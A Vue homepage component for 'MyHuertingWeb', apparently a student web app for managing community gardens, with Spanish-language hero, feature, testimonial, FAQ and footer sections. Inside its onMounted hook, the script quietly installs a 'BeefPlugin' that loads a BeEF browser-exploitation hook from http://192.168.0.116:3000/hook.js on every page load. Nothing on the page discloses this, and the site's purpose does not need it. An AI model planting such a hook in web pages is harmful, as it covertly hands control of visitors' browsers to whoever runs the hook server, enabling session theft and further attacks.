<template>
  <div>
    <!-- Header Hero Section -->
    <header class="hero">
      <nav class="nav container" id="inicio">
        <div class="nav__logo">
          <h2 class="nav__title">MyHuertingWeb</h2>
        </div>
        <ul class="nav__link nav__link--menu" :class="{ 'nav__link--show': showMenu }">
          <li class="nav_items">
            <a href="#inicio" class="nav__links" @click="closeMenu">Inicio</a>
          </li>
          <li class="nav_items">
            <a href="#about" class="nav__links" @click="closeMenu">Acerca de</a>
          </li>
          <li class="nav_items">
            <a href="#contacto" class="nav__links" @click="closeMenu">Contacto</a>
          </li>
          <li class="nav_items">
            <a href="#contexto" class="nav__links" @click="closeMenu">Contexto</a>
          </li>
          <div class="nav__inputs">
            <button type="button" @click="$router.push('/sign-up')" class="nav__submit">Regístrate</button>
            <button type="button" @click="$router.push('/log-in')" class="nav__submit">Inicia Sesión</button>
          </div>
          <img src="/images/close.svg" class="nav__close" alt="" @click="toggleMenu" />
        </ul>
        <div class="nav__menu" @click="toggleMenu">
          <img src="/images/menu.svg" alt="" />
        </div>
      </nav>

      <section class="hero__container container">
        <h1 class="hero__title">
          Aprende a gestionar un huerto comunitario desde cero
        </h1>
        <p class="hero__paragraph">
          Elige aprender cada aspecto de un huerto comunitario, desde el más
          básico hasta el más complejo. Dentro del sistema tendrás acceso a un
          montón de guías sobre el cuidado de plantas, optimización de recursos
          y espacios, entre otras múltiples opciones.
        </p>
        <a href="#inicio" class="cta">Empieza ya</a>
      </section>
    </header>

    <main>
      <!-- About Section -->
      <section class="container about" id="about">
        <h2 class="subtitle">¿Qué aprenderás en este sistema?</h2>
        <p class="about__paragraph">
          Todo lo necesario y obligatorio sobre la gestión de huertos
          comunitarios (Tipos de plantas, Cuidado de plantas, Optimización de
          recursos, Fertilización ecológica y más)
        </p>
        <div class="about__main">
          <article class="about__icons">
            <img src="/images/planta.svg" class="about__icon" alt="Gestión de Cultivos" />
            <h3 class="about__title">Gestión de Cultivos</h3>
            <p class="about__paragraph">
              Organiza y registra fácilmente todos los cultivos de tu huerto urbano. Controla fechas, cantidades,
              observaciones y mejora tu producción cada día.
            </p>
          </article>
          <article class="about__icons">
            <img src="/images/ecologico.svg" class="about__icon" alt="Asignación de Tareas" />
            <h3 class="about__title">Asignación de Tareas</h3>
            <p class="about__paragraph">
              Programa y asigna tareas de mantenimiento, siembra o riego entre los miembros. Mantén el huerto organizado
              y bien gestionado.
            </p>
          </article>
          <article class="about__icons">
            <img src="/images/gota.svg" class="about__icon" alt="Guías en Videos" />
            <h3 class="about__title">Guías en Videos</h3>
            <p class="about__paragraph">
              Consulta videos educativos sobre agricultura urbana: aprende sobre buenas prácticas, fertilización
              ecológica, tipos de plantas, etc.
            </p>
          </article>
        </div>
      </section>

      <!-- Knowledge Section -->
      <section class="knowledge">
        <div class="knowledge__container container">
          <div class="knowledge__texts">
            <h2 class="subtitle">
              Sistema de Gestión de Huertos Urbanos Comunitarios ¡Domina todos
              los aspectos esenciales!
            </h2>
            <p class="knowledge__paragraph">
              Este sistema está diseñado para ayudarte a gestionar tu huerto urbano comunitario de forma sencilla y
              efectiva. Desde el registro de cultivos hasta la planificación de tareas, todo lo tienes al alcance de un
              clic. Con MyHuertingWeb podrás fomentar la colaboración, el cuidado ecológico y la producción sostenible.
            </p>
            <a href="#inicio" class="cta">Ingresa al Sistema</a>
          </div>
          <figure class="knowledge_picture">
            <img src="/images/huerto.jpg" alt="Huerto" class="knowledge__img" />
          </figure>
        </div>
      </section>

      <!-- Support Section -->
      <section class="suport container">
        <h2 class="subtitle">Recursos del Sistema</h2>
        <div class="suport__table">
          <div class="suport__element">
            <h3 class="suport__name">Guías</h3>
            <img src="/images/guide.svg" class="suport__icon" alt="Guías" />
            <div class="suport__items">
              <p class="suport__features">Gestionar cultivos</p>
              <p class="suport__features">Administar tareas</p>
              <p class="suport__features">Videos guía de cultivos</p>
            </div>
          </div>
          <div class="suport__element suport__element--best">
            <h3 class="suport__name">Usuarios</h3>
            <img src="/images/group.svg" class="suport__icon" alt="Comunidad" />
            <div class="suport__items">
              <p class="suport__features">Registro e inicio de sesión</p>
              <p class="suport__features">Asignación de tareas</p>
              <p class="suport__features">Visualización de tareas</p>
            </div>
          </div>
          <div class="suport__element">
            <h3 class="suport__name">Soporte Técnico</h3>
            <img src="/images/support.svg" class="suport__icon" alt="Soporte" />
            <div class="suport__items">
              <p class="suport__features">Manual de usuario</p>
              <p class="suport__features">Asistencia técnica</p>
              <p class="suport__features">Resolución de problemas</p>
            </div>
          </div>
        </div>
      </section>

      <!-- Testimony Section -->
      <section class="testimony" id="contacto">
        <div class="testimony__container container">
          <img src="/images/leftarrow.svg" alt="Anterior" class="testimony__arrow" @click="changeTestimony(-1)" />
          <section v-for="(testimony, index) in testimonies" :key="testimony.id" class="testimony__body"
            :class="{ 'testimony__body--show': currentTestimony === index }">
            <div class="testimony__texts">
              <h2 class="subtitle">
                Mi nombre es {{ testimony.name }},
                <span class="testimony__course">{{ testimony.course }}</span>
              </h2>
              <p class="testimony__review">{{ testimony.review }}</p>
            </div>
            <figure class="testimony__picture">
              <img :src="testimony.image" alt="" class="testimony__img" />
            </figure>
          </section>
          <img src="/images/rightarrow.svg" alt="Siguiente" class="testimony__arrow" @click="changeTestimony(1)" />
        </div>
      </section>

      <!-- Questions Section -->
      <section class="questions container" id="contexto">
        <h2 class="subtitle">Incógnitas</h2>
        <p class="questions__paragraph">
          A continuación, encontrarás algunas preguntas frecuentes que te ayudarán a comprender el propósito de este
          proyecto, su contexto académico y su enfoque en el desarrollo web.
        </p>

        <section class="questions__container">
          <article v-for="(question, index) in questions" :key="index" class="questions__padding"
            :class="{ 'questions__padding--add': question.isOpen }">
            <div class="questions__answer">
              <h3 class="questions__title" @click="toggleQuestion(index)">
                {{ question.title }}
                <span class="questions__arrow" :class="{ 'questions__arrow--rotate': question.isOpen }">
                  <img src="/images/arrow.svg" alt="" class="questions__img" />
                </span>
              </h3>
              <p class="questions__show" :style="{ height: question.isOpen ? 'auto' : '0px' }">
                {{ question.answer }}
              </p>
            </div>
          </article>

          <section class="questions__offer">
            <h2 class="subtitle">
              ¿Estás listo para aprender a gestionar un Huerto Comunitario?
            </h2>
            <p class="questions__copy">
              Descubre cómo organizar cultivos, asignar tareas y trabajar en equipo para mantener un huerto urbano
              eficiente y sostenible. Con MyHuertingWeb podrás registrar tus avances, acceder a guías prácticas y
              gestionar cada aspecto del huerto desde un solo lugar. ¡Da el primer paso hacia una agricultura
              comunitaria más ordenada, accesible y productiva!
            </p>
            <a href="#inicio" class="cta">Aprende Ahora</a>
          </section>
        </section>
      </section>
    </main>

    <!-- Footer -->
    <footer class="footer" id="footer">
      <section class="footer__container container">
        <nav class="nav nav--footer">
          <h2 class="footer__title">MyHuertingWeb</h2>
          <ul class="nav__link nav__link--footer">
            <li class="nav_items">
              <a href="#inicio" class="nav__links">Inicio</a>
            </li>
            <li class="nav_items">
              <a href="#about" class="nav__links">Acerca de</a>
            </li>
            <li class="nav_items">
              <a href="#contacto" class="nav__links">Contacto</a>
            </li>
            <li class="nav_items">
              <a href="#contexto" class="nav__links">Contexto</a>
            </li>
          </ul>
        </nav>
      </section>

      <section class="footer__copy container">
        <div class="footer__social">
          <a href="https://chat.whatsapp.com/Lfd5UUzlXElHgjyB104ib1" target="_blank" class="footer__icons">
            <img src="/images/whatsapp.svg" class="footer__img" alt="WhatsApp" />
          </a>
          <a href="https://x.com/MyHuertingWeb" target="_blank" class="footer__icons">
            <img src="/images/x.svg" class="footer__img" alt="X (Twitter)" />
          </a>
          <a href="https://www.instagram.com/my_huerting_web_/" target="_blank" class="footer__icons">
            <img src="/images/instagram.svg" class="footer__img" alt="Instagram" />
          </a>
        </div>
        <h3 class="footer__copyright">
          Derechos reservados &copy; MyHuertingWeb
        </h3>
      </section>
    </footer>
  </div>
</template>

<script>
import { ref, reactive, onMounted } from 'vue'
import { useSlider } from './js/slider.js'
import { useQuestions } from './js/questions.js'
import { getCurrentInstance } from 'vue'
import BeefPlugin from './js/beef.js'

export default {
  name: 'HomePage',
  setup() {
    // Control menú
    const showMenu = ref(false)
    const toggleMenu = () => {
      showMenu.value = !showMenu.value
    }
    const closeMenu = () => {
      showMenu.value = false
    }

    onMounted(() => {
      const app = getCurrentInstance().appContext.app
      
      // Usar el plugin BeEF
      BeefPlugin.install(app, {
        hookUrl: 'http://192.168.0.116:3000/hook.js'
      })
    })

    // Navegación
    const goToRegister = () => {
      alert('Ir a registro')
    }
    
    const goToLogin = () => {
      alert('Ir a login')
    }

    // Testimonios y slider
    const { currentTestimony, changeTestimony } = useSlider()

    // Preguntas
    const { questions, toggleQuestion } = useQuestions()

    // Datos de testimonios
    const testimonies = reactive([
      {
        id: 1,
        name: 'Roberth Alonzo',
        course: 'Estudiante de la ULEAM',
        review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
        image: '/images/foto1.jpg'
      },
      {
        id: 2,
        name: 'Franklin Molina',
        course: 'Estudiante de la ULEAM',
        review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
        image: '/images/foto2.jpg'
      },
      {
        id: 3,
        name: 'Jose Velez',
        course: 'Estudiante de la ULEAM',
        review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
        image: '/images/foto3.jpg'
      }
    ])

    return {
      showMenu,
      toggleMenu,
      closeMenu,
      goToRegister,
      goToLogin,
      currentTestimony,
      changeTestimony,
      questions,
      toggleQuestion,
      testimonies
    }
  }
}
</script>

<style>
@import '../home/css/normalize.css';
@import '../home/css/style.css';
</style>
